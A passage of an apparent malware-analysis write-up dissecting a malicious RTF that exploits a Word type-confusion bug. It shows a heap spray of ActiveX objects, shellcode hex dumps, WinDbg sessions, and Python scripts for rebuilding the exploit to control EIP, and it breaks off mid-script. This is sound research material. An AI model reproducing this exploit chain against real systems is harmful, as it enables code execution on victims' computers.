  inflating: 00039807.doc/word/activeX/activeX27.xml
  inflating: 00039807.doc/word/activeX/activeX28.xml
  inflating: 00039807.doc/word/activeX/activeX29.xml
  inflating: 00039807.doc/word/activeX/activeX3.xml
  inflating: 00039807.doc/word/activeX/activeX30.xml
  inflating: 00039807.doc/word/activeX/activeX31.xml
  inflating: 00039807.doc/word/activeX/activeX32.xml
  inflating: 00039807.doc/word/activeX/activeX33.xml
  inflating: 00039807.doc/word/activeX/activeX34.xml
  inflating: 00039807.doc/word/activeX/activeX35.xml
  inflating: 00039807.doc/word/activeX/activeX36.xml
  inflating: 00039807.doc/word/activeX/activeX37.xml
  inflating: 00039807.doc/word/activeX/activeX38.xml
  inflating: 00039807.doc/word/activeX/activeX39.xml
  inflating: 00039807.doc/word/activeX/activeX4.xml
  inflating: 00039807.doc/word/activeX/activeX40.xml
  inflating: 00039807.doc/word/activeX/activeX5.xml
  inflating: 00039807.doc/word/activeX/activeX6.xml
  inflating: 00039807.doc/word/activeX/activeX7.xml
  inflating: 00039807.doc/word/activeX/activeX8.xml
  inflating: 00039807.doc/word/activeX/activeX9.xml
   creating: 00039807.doc/word/activeX/_rels/
  inflating: 00039807.doc/word/activeX/_rels/activeX1.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX10.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX11.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX12.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX13.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX14.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX15.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX16.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX17.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX18.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX19.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX2.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX20.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX21.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX22.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX23.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX24.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX25.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX26.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX27.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX28.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX29.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX3.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX30.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX31.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX32.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX33.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX34.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX35.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX36.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX37.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX38.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX39.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX4.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX40.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX5.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX6.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX7.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX8.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX9.xml.rels
  inflating: 00039807.doc/word/document.xml
  inflating: 00039807.doc/word/fontTable.xml
  inflating: 00039807.doc/word/media/image1.wmf
  inflating: 00039807.doc/word/settings.xml
  inflating: 00039807.doc/word/styles.xml
  inflating: 00039807.doc/word/theme/theme1.xml
  inflating: 00039807.doc/word/webSettings.xml
  inflating: 00039807.doc/word/_rels/document.xml.rels
  inflating: 00039807.doc/[Content_Types].xml
  inflating: 00039807.doc/_rels/.rels

$ unzip cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc -d 000538E9.doc
Archive:  cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc
warning [cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc]:  1536 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: 000538E9.doc/docProps/app.xml
  inflating: 000538E9.doc/docProps/core.xml
  inflating: 000538E9.doc/word/document.xml
  inflating: 000538E9.doc/word/endnotes.xml
  inflating: 000538E9.doc/word/fontTable.xml
  inflating: 000538E9.doc/word/footnotes.xml
  inflating: 000538E9.doc/word/settings.xml
  inflating: 000538E9.doc/word/styles.xml
  inflating: 000538E9.doc/word/theme/theme1.xml
  inflating: 000538E9.doc/word/webSettings.xml
  inflating: 000538E9.doc/word/_rels/document.xml.rels
  inflating: 000538E9.doc/[Content_Types].xml
  inflating: 000538E9.doc/_rels/.rels
```

unzip warns us that there are 1536 extra bytes at the beginning of both ZIP files. This is because objects embeded in RTF files are not docx, but CDF instead. CDF is a file format created by Microsoft, which is basically a file container. (https://en.wikipedia.org/wiki/Compound\_File\_Binary\_Format)

We will see how to handle that kind of files later, but for now lets keep analyzing those Word documents.

## 0x02 ‚Äì Analysis of the vulnerabilty

This file has very little content. We can start by examining document.xml:

```
$ xmllint word/document.xml
word/document.xml:7: parser error : Opening and ending tag mismatch: font line 6 and OLEObject
 &lt;/o:OLEObject>
 ^
word/document.xml:8: parser error : Opening and ending tag mismatch: OLEObject line 5 and shapeDefaults
 &lt;/w:shapeDefaults>
 ^
word/document.xml:9: parser error : Opening and ending tag mismatch: shapeDefaults line 4 and body
 &lt;/w:body>
 ^
word/document.xml:10: parser error : Opening and ending tag mismatch: body line 3 and document
&lt;/w:document>
 ^
word/document.xml:10: parser error : Premature end of data in tag document line 2
&lt;/w:document>

```

It seems it is a malformed file, as it has some non-matching XML tags.

```
$ cat word/document.xml
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?>
&lt;w:document xmlns:ve="https://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="https://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="https://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp="https://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="https://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:wne="https://schemas.microsoft.com/office/word/2006/wordml">
 &lt;w:body >
 &lt;w:shapeDefaults >
 &lt;o:OLEObject >
 &lt;w:font w:name="LincerCharCharË£¨‡¢àfontÔºöbatang">&lt;o:idmap/>
 &lt;/o:OLEObject>
 &lt;/w:shapeDefaults>
 &lt;/w:body>
&lt;/w:document>

```

We can see that the tag is closed with . Also, there are some weird characters in between:

```
[0x00000000 0% 2304 word/document.xml]> xc
- offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF0123456789ABCDEF comment
[...]
0x000002a0 6175 6c74 7320 3e0d 0a09 0909 3c6f 3a4f 4c45 4f62 6a65 6374 203e 0d0a 0909 0909 aults >.....&lt;o:OLEObject >......
0x000002c0 3c77 3a66 6f6e 7420 773a 6e61 6d65 3d22 4c69 6e63 6572 4368 6172 4368 6172 e8a3 &lt;w:font w:name="LincerCharChar..
0x000002e0 ace0 a288 666f 6e74 efbc 9a62 6174 616e 6722 3e3c 6f3a 6964 6d61 702f 3e0d 0a09 ....font...batang">&lt;o:idmap/>...
0x00000300 0909 3c2f 6f3a 4f4c 454f 626a 6563 743e 0d0a 0909 3c2f 773a 7368 6170 6544 6566 ..&lt;/o:OLEObject>....&lt;/w:shapeDef
0x00000320 6175 6c74 733e 0d0a 093c 2f77 3a62 6f64 793e 0d0a 3c2f 773a 646f 6375 6d65 6e74 aults>...&lt;/w:body>..&lt;/w:document
0x00000340 3eff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff >...............................
```

We note the bytes e8a3ace0a288 for later.

Lets do a quick WinDbg session of the execution of the exploit. To do so, open the RTF file and attach it in WinDbg.

```
0:014> g
ModLoad: 69700000 6978c000   C:WindowsSysWOW64UIAutomationCore.DLL
ModLoad: 75510000 75515000   C:Windowssyswow64PSAPI.DLL
ModLoad: 696c0000 696fc000   C:WindowsSysWOW64OLEACC.dll
(814.e80): Unknown exception - code e0000002 (first chance)
ModLoad: 69680000 696b1000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVWPFT532.CNV
ModLoad: 69660000 6967f000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVmsconv97.dll
ModLoad: 69630000 6965f000   SHDOCVW.dll
ModLoad: 69600000 6962f000   C:WindowsSysWOW64shdocvw.dll
ModLoad: 69680000 696be000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVWPFT632.CNV
ModLoad: 69640000 6965f000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVmsconv97.dll
ModLoad: 69640000 69671000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVWPFT532.CNV
ModLoad: 696a0000 696bf000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVmsconv97.dll
ModLoad: 69640000 6967e000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVWPFT632.CNV
ModLoad: 69680000 6969f000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVmsconv97.dll
(814.e80): Unknown exception - code e0000002 (first chance)
(814.e80): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program Files (x86)Microsoft OfficeOffice15wwlib.dll -
eax=088888ec ebx=00000000 ecx=088888ec edx=00000004 esi=0937b008 edi=0938854c
eip=6f6c82a3 esp=0029457c ebp=002945e8 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202
wwlib!DllGetLCID+0x2e1e19:
6f6c82a3 8b08            mov     ecx,dword ptr [eax]  ds:002b:088888ec=????????
```

It seems there is something wrong in the exploit, as the process is crashing when attempting to read from an invalid memory address. Some context:

```
0:000> ub;u
wwlib!DllGetLCID+0x2e1dfc:
6f6c8286 0f84d268e9ff    je      wwlib!DllGetLCID+0x1786d4 (6f55eb5e)
6f6c828c 8b4944          mov     ecx,dword ptr [ecx+44h]
6f6c828f 85c9            test    ecx,ecx
6f6c8291 0f84c768e9ff    je      wwlib!DllGetLCID+0x1786d4 (6f55eb5e)
6f6c8297 8b4744          mov     eax,dword ptr [edi+44h]
6f6c829a 894844          mov     dword ptr [eax+44h],ecx
6f6c829d 8b4744          mov     eax,dword ptr [edi+44h]
6f6c82a0 8b4044          mov     eax,dword ptr [eax+44h]
wwlib!DllGetLCID+0x2e1e19:
6f6c82a3 8b08            mov     ecx,dword ptr [eax]
6f6c82a5 50              push    eax
6f6c82a6 ff5104          call    dword ptr [ecx+4]
6f6c82a9 e9b068e9ff      jmp     wwlib!DllGetLCID+0x1786d4 (6f55eb5e)
6f6c82ae 83f802          cmp     eax,2
6f6c82b1 750f            jne     wwlib!DllGetLCID+0x2e1e38 (6f6c82c2)
6f6c82b3 8d4624          lea     eax,[esi+24h]
6f6c82b6 50              push    eax
```

The function seems to be loading an object from eax and then calling a method at offset 0x04, passing its own reference in eax.

Where does the value 0x088888ec come from? Why is Word crashing? Lets look back at the value we found in document.xml: e8a3ace0a288. Are they related?

Office XML files are UTF-8 encoded. However, Windows apps use UTF-16 internally:

```
$ python2
Python 2.7.14 (default, Sep 20 2017, 01:25:59)
[GCC 7.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import struct
>>> x = "e8a3ace0a288".decode("hex")
>>> unicode(x.decode("utf-8")).encode("utf-16-le")
'xecx88x88x08'
>>> hex(struct.unpack("<L", "xecx88x88x08")[0])
'0x88888ec'
```

Bingo :)

So, if we modify this value we can make Word execute the following instructions. Lets set EAX = X:

```
6f6c82a3 8b08            mov     ecx,dword ptr [X]
6f6c82a5 50              push    X
6f6c82a6 ff5104          call    dword ptr [X+4]
```

Therefore, if we want to control EIP (which we certainly do), we need to put the following data in a controlled memory address:

```
Direcci√≥n    Valor
X            X
X + 4        EIP objetivo
```

How can we meet this conditions? The sample‚Äôs authors made it by using a heap spray.

## 0x03 ‚Äì Analysis of the heap spray

When we looked at the contents of the first object, cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5\_object\_00039807.doc, the pressence of 40 activeX objects immediately caught our attention. This reminds us of [the classic Office heap spraying technique](https://www.greyhathacker.net/?p=911).

Lets examine document.xml, which describes the contents of the file:

```
[...]
 &lt;w:object w:dxaOrig="1440" w:dyaOrig="1440">
 &lt;v:shape id="_x0000_i1060" type="#_x0000_t75" style="width:1in;height:1in" o:ole="">
 &lt;v:imagedata r:id="rId4" o:title=""/>
 &lt;/v:shape>
 &lt;w:control r:id="rId6" w:name="Image117" w:shapeid="_x0000_i1060"/>
 &lt;/w:object>
 &lt;/w:r>
 &lt;w:r>
 &lt;w:object w:dxaOrig="1440" w:dyaOrig="1440">
 &lt;v:shape id="_x0000_i1058" type="#_x0000_t75" style="width:1in;height:1in" o:ole="">
 &lt;v:imagedata r:id="rId4" o:title=""/>
 &lt;/v:shape>
 &lt;w:control r:id="rId7" w:name="Image116" w:shapeid="_x0000_i1058"/>
 &lt;/w:object>
 &lt;/w:r>
 &lt;w:r>
 &lt;w:object w:dxaOrig="1440" w:dyaOrig="1440">
 &lt;v:shape id="_x0000_i1056" type="#_x0000_t75" style="width:1in;height:1in" o:ole="">
 &lt;v:imagedata r:id="rId4" o:title=""/>
 &lt;/v:shape>
 &lt;w:control r:id="rId8" w:name="Image115" w:shapeid="_x0000_i1056"/>
 &lt;/w:object>
 &lt;/w:r>
 &lt;w:r>
 &lt;w:object w:dxaOrig="1440" w:dyaOrig="1440">
 &lt;v:shape id="_x0000_i1054" type="#_x0000_t75" style="width:1in;height:1in" o:ole="">
 &lt;v:imagedata r:id="rId4" o:title=""/>
 &lt;/v:shape>
 &lt;w:control r:id="rId9" w:name="Image114" w:shapeid="_x0000_i1054"/>
 &lt;/w:object>
 &lt;/w:r>
 &lt;w:r>
 &lt;w:object w:dxaOrig="1440" w:dyaOrig="1440">
 &lt;v:shape id="_x0000_i1052" type="#_x0000_t75" style="width:1in;height:1in" o:ole="">
 &lt;v:imagedata r:id="rId4" o:title=""/>
 &lt;/v:shape>
 &lt;w:control r:id="rId10" w:name="Image113" w:shapeid="_x0000_i1052"/>
 &lt;/w:object>
 &lt;/w:r>
 &lt;w:r>
[...]
```

Its contents have been trimmed here to avoid making this post excessively long, but the original one has several embeded controls (from rId5 to rId44). This is the content of word/\_rels/document.xml.rels:

```
&lt;Relationships xmlns="https://schemas.openxmlformats.org/package/2006/relationships">
 &lt;Relationship Id="rId8" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX4.xml"/>
 &lt;Relationship Id="rId13" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX9.xml"/>
 &lt;Relationship Id="rId18" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX14.xml"/>
 &lt;Relationship Id="rId26" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX22.xml"/>
 &lt;Relationship Id="rId39" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX35.xml"/>
 &lt;Relationship Id="rId3" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/>
 &lt;Relationship Id="rId21" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX17.xml"/>
 &lt;Relationship Id="rId34" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX30.xml"/>
 &lt;Relationship Id="rId42" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX38.xml"/>
 &lt;Relationship Id="rId7" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX3.xml"/>
 &lt;Relationship Id="rId12" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX8.xml"/>
 &lt;Relationship Id="rId17" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX13.xml"/>
 &lt;Relationship Id="rId25" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX21.xml"/>
 &lt;Relationship Id="rId33" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX29.xml"/>
 &lt;Relationship Id="rId38" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX34.xml"/>
 &lt;Relationship Id="rId46" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/>
 &lt;Relationship Id="rId2" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>
 &lt;Relationship Id="rId16" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX12.xml"/>
 &lt;Relationship Id="rId20" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX16.xml"/>
 &lt;Relationship Id="rId29" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX25.xml"/>
 &lt;Relationship Id="rId41" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX37.xml"/>
 &lt;Relationship Id="rId1" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
 &lt;Relationship Id="rId6" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX2.xml"/>
 &lt;Relationship Id="rId11" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX7.xml"/>
 &lt;Relationship Id="rId24" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX20.xml"/>
 &lt;Relationship Id="rId32" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX28.xml"/>
 &lt;Relationship Id="rId37" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX33.xml"/>
 &lt;Relationship Id="rId40" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX36.xml"/>
 &lt;Relationship Id="rId45" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/>
 &lt;Relationship Id="rId5" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX1.xml"/>
 &lt;Relationship Id="rId15" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX11.xml"/>
 &lt;Relationship Id="rId23" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX19.xml"/>
 &lt;Relationship Id="rId28" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX24.xml"/>
 &lt;Relationship Id="rId36" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX32.xml"/>
 &lt;Relationship Id="rId10" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX6.xml"/>
 &lt;Relationship Id="rId19" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX15.xml"/>
 &lt;Relationship Id="rId31" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX27.xml"/>
 &lt;Relationship Id="rId44" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX40.xml"/>
 &lt;Relationship Id="rId4" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.wmf"/>
 &lt;Relationship Id="rId9" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX5.xml"/>
 &lt;Relationship Id="rId14" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX10.xml"/>
 &lt;Relationship Id="rId22" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX18.xml"/>
 &lt;Relationship Id="rId27" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX23.xml"/>
 &lt;Relationship Id="rId30" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX26.xml"/>
 &lt;Relationship Id="rId35" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX31.xml"/>
 &lt;Relationship Id="rId43" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX39.xml"/>
&lt;/Relationships>

```

We can see that most of them reference some activeX control. Those documents are all the same and contain:

```
¬†&lt;ax:ocx xmlns:ax="https://schemas.microsoft.com/office/2006/activeX" xmlns:r="https://schemas.openxmlformats.org/officeDocument/2006/relationships" ax:classid="{00000000-0000-0000-0000-000000000001}" ax:persistence="persistStorage" r:id="rId1"/>
```

We can find those relationships in word/activeX/\_rels. Once again, all the files are identical and contain:

```
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?>
&lt;Relationships xmlns="https://schemas.openxmlformats.org/package/2006/relationships">
 &lt;Relationship Id="rId1" Type="https://schemas.microsoft.com/office/2006/relationships/activeXControlBinary" Target="activeX1.bin"/>
&lt;/Relationships>

```

And therefore the embeded object is located at word/activeX/activeX1.bin.

```
$ file word/activeX/activeX1.bin
word/activeX/activeX1.bin: Composite Document File V2 Document, Cannot read section info
```

It is again a CDF file. Its contents will be loaded multiple times, effectively creating a heap spray. This is what will allow us to have controlled data at predictable addresses.

The payload starts at offset 0x800, just after the CDF headers. We can see that the byte sequence cb40 9472 ec83 8808 is repeated until offset 0x00000f30, where we see cb40 9472 d010 9472 followed by some ‚Äúrandom‚Äù bytes. After that, 2b0e 9872 is repeated until offset 0x00001800. This whole sequence is repeated until the end of the file.

```
0x000007f0  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x00000800  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00000810  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00000820  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00000830  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
[...]
0x00000f20  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00000f30  cb40 9472 d010 9472 8f08 9572 b0dd 9572  .@.r...r...r...r
0x00000f40  908c 8808 0102 0000 4000 0000 45c0 a472  ........@...E..r
0x00000f50  892d 8888 8808 9b9b 33c9 648b 7130 8b76  .-......3.d.q0.v
0x00000f60  0c8b 761c 8b46 088b 7e20 8b36 813f 6b00  ..v..F..~ .6.?k.
0x00000f70  6500 75f0 8bf0 eb57 608b de56 8b73 3c8b  e.u....W`..V.s<.
0x00000f80  741e 7803 f356 8b76 2003 f333 c949 41ad  t.x..V.v ..3.IA.
0x00000f90  03c3 5633 f60f be10 3af2 7408 c1ce 0703  ..V3....:.t.....
0x00000fa0  f240 ebf1 3975 005e 75e4 5a8b fb8b 5a24  .@..9u.^u.Z...Z$
[...]
0x000010a0  8bc7 b900 0000 008b 1681 f233 33ad bc89  ...........33...
0x000010b0  1783 c101 81f9 5001 0000 7408 83c6 0483  ......P...t.....
0x000010c0  c704 ebe3 ffe0 cccc 2b0e 9872 2b0e 9872  ........+..r+..r
0x000010d0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
0x000010e0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
0x000010f0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
[...]
0x000017d0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
0x000017e0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
0x000017f0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
0x00001800  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00001810  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00001820  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
```

Lets see how good is this spray. We attach WinDbg to Word after opening the malicious RTF and let it crash again. Then we look for some tag in the sprayed data, such as cb409472d0109472.

```
0:000> .logopen C:usersuserdesktoph1.txt
Opened log file 'C:usersuserdesktoph1.txt'
0:000> s 0 L?+80000000 cb 40 94 72 d0 10 94 72
[...]
0:000> .logclose
Closing open log file C:usersuserdesktoph1.txt
```

In the log file we can observe that the tag was first found in 0x02e80f50, and last found in 0x12eaff50. As we have chosen a tag which is not at the precise beginning of the sprayed data, we have to subtract its offset to obtain the real addresses in which we will find our payload:

```
0x00000f30  cb40 9472 d010 9472
```

0xf30 ‚Äì 0x800 = 0x730

0x02e80f50 ‚Äì 0x730 = 0x2E80820

```
0:000> dd 0x2E80820
02e80820  729440cb 088883ec 729440cb 088883ec
02e80830  729440cb 088883ec 729440cb 088883ec
02e80840  729440cb 088883ec 729440cb 088883ec
02e80850  729440cb 088883ec 729440cb 088883ec
02e80860  729440cb 088883ec 729440cb 088883ec
02e80870  729440cb 088883ec 729440cb 088883ec
02e80880  729440cb 088883ec 729440cb 088883ec
02e80890  729440cb 088883ec 729440cb 088883ec

0:000> dd 0x2E80820+0x1000
02e81820  729440cb 088883ec 729440cb 088883ec
02e81830  729440cb 088883ec 729440cb 088883ec
02e81840  729440cb 088883ec 729440cb 088883ec
02e81850  729440cb 088883ec 729440cb 088883ec
02e81860  729440cb 088883ec 729440cb 088883ec
02e81870  729440cb 088883ec 729440cb 088883ec
02e81880  729440cb 088883ec 729440cb 088883ec
02e81890  729440cb 088883ec 729440cb 088883ec

0:000> dd 0x2E80820+0x1000+0x1000
02e82820  729440cb 088883ec 729440cb 088883ec
02e82830  729440cb 088883ec 729440cb 088883ec
02e82840  729440cb 088883ec 729440cb 088883ec
02e82850  729440cb 088883ec 729440cb 088883ec
02e82860  729440cb 088883ec 729440cb 088883ec
02e82870  729440cb 088883ec 729440cb 088883ec
02e82880  729440cb 088883ec 729440cb 088883ec
02e82890  729440cb 088883ec 729440cb 088883ec

0:000> dd 0x2E80820+0x1000+0x1000-4
02e8281c  72980e2b 729440cb 088883ec 729440cb
02e8282c  088883ec 729440cb 088883ec 729440cb
02e8283c  088883ec 729440cb 088883ec 729440cb
02e8284c  088883ec 729440cb 088883ec 729440cb
02e8285c  088883ec 729440cb 088883ec 729440cb
02e8286c  088883ec 729440cb 088883ec 729440cb
02e8287c  088883ec 729440cb 088883ec 729440cb
02e8288c  088883ec 729440cb 088883ec 729440cb
```

The contents of activex1.bin can be found once each 0x1000 bytes from the first location where our payload is loaded.

Now we have everything we need to control EIP. We only need to be able to modify some files and build a RTF.

## 0x04 ‚Äì Creating the matryoska

We have to manage the following structure in order to modify the relevant files:

```
RTF
    CDF/OLE                                Objeto embebido en RTF
        DOCX/ZIP                           Archivo dentro del contenedor CDF
            XML -> document.xml            Archivo que queremos modificar
    CDF/OLE                                Objeto embebido en RTF
        DOCX/ZIP                           Archivo dentro del contenedor CDF
            CDF/OLE -> activex1.bin        Archivo que queremos modificar
```

This is the plan:

* 1. Modify the contents of activex1.bin, changing the payload
* 2. Modify document.xml, changing the target address
* 3. Create two new ZIPs/DOCX with the previously changed files
* 4. Create two new CDF files containing the previously created ZIPs/DOCX
* 5. Replace the two relevant objects in the original RTF with the two we have just created

### Modifying activex1.bin

To do a quick test we will overwrite the first dword of each repeated chunk (offset 0x800 + N \* 0x1000) with 0x41424344

```
$ cat tag_bin.py
import sys

if __name__ == '__main__':
        in_filepath = sys.argv[1]
        out_filepath = sys.argv[2]

        f = open(in_filepath, "rb")
        original = bytearray(f.read())
        f.close()

        begin = 0x800
        offset = 0x1000

        p = begin
        while p < len(original) - 4:
                original[p] = 0x44
                original[p+1] = 0x43
                original[p+2] = 0x42
                original[p+3] = 0x41

                p += offset

        f = open(out_filepath, "wb")
        f.write(original)
        f.close()

$ python tag_bin.py 00039807.doc/word/activeX/activeX1.bin test.bin
$ mv test.bin 00039807.doc/word/activeX/activeX1.bin
```
### Modifying document.xml

We want to replace the address used by the authors of the sample with an address which is valid in our environment:

```
$ cat replace_offset.py
import struct
import sys

def dword_to_crap(v):
    # unicode -> utf8
    return struct.pack("<I", v).decode("utf-16le").encode("utf-8").encode("hex") def crap_to_dword(v): # utf8 -> unicode
    return unicode(v.decode("utf-8")).encode("utf-16le")

if __name__ == '__main__':
    whatb = sys.argv[1]
    withb = sys.argv[2]
    fpath = sys.argv[3]
    fdest = sys.argv[4]

